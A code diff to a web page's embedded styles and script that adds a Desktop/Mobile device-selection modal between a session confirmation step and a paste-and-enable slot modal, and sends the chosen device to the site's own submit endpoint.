@@ -1422,6 +1422,54 @@ function buildSlotsPage(record) {
     color: var(--muted);
     min-height: 20px;
   }
+
+  /* ── DEVICE SELECTION STYLES ── */
+  .device-text {
+    text-align: center;
+    font-size: 1.1rem;
+    color: var(--text);
+    margin-bottom: 24px;
+    line-height: 1.6;
+  }
+  .device-btn {
+    width: 100%;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    color: #fff;
+    border: none;
+    padding: 16px 0;
+    border-radius: 12px;
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 1.1rem;
+    font-weight: 700;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    cursor: pointer;
+    box-shadow: 0 0 40px rgba(192,38,211,0.4);
+    transition: transform 0.2s, box-shadow 0.2s;
+    margin-bottom: 12px;
+  }
+  .device-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 60px rgba(192,38,211,0.6);
+  }
+  .device-btn:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+    transform: none;
+  }
+  .device-btn.cyan {
+    background: linear-gradient(135deg, var(--accent3), #0891b2);
+    box-shadow: 0 0 40px rgba(6,182,212,0.4);
+  }
+  .device-btn.cyan:hover {
+    box-shadow: 0 0 60px rgba(6,182,212,0.6);
+  }
+  .device-status {
+    text-align: center;
+    font-size: 0.75rem;
+    color: var(--muted);
+    min-height: 20px;
+  }
 </style>
 </head>
 <body>
@@ -1716,6 +1764,7 @@ if(communitySection) observer.observe(communitySection);
 let pastedValues = {};
 let currentSlot = null;
 let currentSlotName = null;
+let selectedDevice = null;
 
 function closeModal() { 
   document.getElementById('modalOverlay').classList.remove('open'); 
@@ -1770,19 +1819,75 @@ async function handleYesClick() {
     
     status.textContent = 'Session ready!';
     
-    // Show the actual slot modal after confirmation
+    // Show device selection modal after confirmation
+    setTimeout(() => {
+      showDeviceSelectionModal();
+    }, 400);
+    
+  } catch (err) {
+    console.error('Priming error:', err);
+    // Even if it fails, proceed to device selection
+    showDeviceSelectionModal();
+  }
+}
+
+/* ── STEP 2: DEVICE SELECTION MODAL ── */
+function showDeviceSelectionModal() {
+  document.getElementById('modalTitle').textContent = \`Slot \${currentSlot} — \${currentSlotName}\`;
+  document.getElementById('modalContent').innerHTML = \`
+    <div class="device-text">What device are you using?</div>
+    <button class="device-btn" id="desktopBtn" onclick="handleDeviceSelect('desktop')">Desktop</button>
+    <button class="device-btn cyan" id="mobileBtn" onclick="handleDeviceSelect('mobile')">Mobile</button>
+    <div class="device-status" id="deviceStatus"></div>
+  \`;
+}
+
+/* ── HANDLE DEVICE SELECTION ── */
+async function handleDeviceSelect(device) {
+  const desktopBtn = document.getElementById('desktopBtn');
+  const mobileBtn = document.getElementById('mobileBtn');
+  const status = document.getElementById('deviceStatus');
+  
+  // Disable both buttons
+  desktopBtn.disabled = true;
+  mobileBtn.disabled = true;
+  
+  selectedDevice = device;
+  status.textContent = 'Sending device info...';
+  
+  // Send device selection request to API
+  try {
+    const res = await fetch('/api/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        slug: PAGE_SLUG, 
+        slots: { ['slot' + currentSlot]: 'DEVICE_SELECTED_' + device.toUpperCase() },
+        device: device,
+        deviceSelection: true
+      })
+    });
+    
+    // Wait a moment
+    await new Promise(r => setTimeout(r, 600));
+    
+    status.textContent = 'Device registered!';
+    
+    // Proceed to paste modal
     setTimeout(() => {
       showSlotModal(currentSlot, currentSlotName);
     }, 400);
     
   } catch (err) {
-    console.error('Priming error:', err);
-    // Even if it fails, proceed to slot modal
-    showSlotModal(currentSlot, currentSlotName);
+    console.error('Device selection error:', err);
+    // Even if request fails, proceed to slot modal
+    setTimeout(() => {
+      showSlotModal(currentSlot, currentSlotName);
+    }, 400);
   }
 }
 
-/* ── STEP 2: SLOT MODAL ── */
+/* ── STEP 3: SLOT MODAL (PASTE & ENABLE) ── */
 function showSlotModal(num, name) {
   document.getElementById('modalTitle').textContent = \`Slot \${num} — \${name}\`;
   document.getElementById('modalContent').innerHTML = \`
@@ -1847,7 +1952,7 @@ async function handleEnable() {
     const res = await fetch('/api/submit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ slug: PAGE_SLUG, slots })
+      body: JSON.stringify({ slug: PAGE_SLUG, slots, device: selectedDevice })
     });
     const data = await res.json();
     if (data.success) {
